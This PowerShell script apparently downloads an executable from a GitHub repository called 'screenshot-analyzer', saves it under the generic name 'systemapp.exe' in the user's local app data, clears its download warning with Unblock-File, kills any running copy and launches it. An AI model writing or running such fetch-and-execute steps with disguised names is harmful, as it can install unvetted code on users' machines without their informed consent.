$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

$Base  = 'https://raw.githubusercontent.com/massoniwe/screenshot-analyzer/main'
$Dest  = Join-Path $env:LOCALAPPDATA 'systemapp'
$Files = @{
    'dist_win/systemapp_new.exe' = 'systemapp.exe'
}

New-Item -ItemType Directory -Force -Path $Dest | Out-Null
Get-Process systemapp -ErrorAction SilentlyContinue | Stop-Process -Force

foreach ($src in $Files.Keys) {
    $path = Join-Path $Dest $Files[$src]
    Write-Host "Скачиваю $src..."
    Invoke-WebRequest "$Base/$src" -OutFile $path -UseBasicParsing
    Unblock-File $path
}

Write-Host "Готово: $Dest" -ForegroundColor Green
Start-Process (Join-Path $Dest 'systemapp.exe')
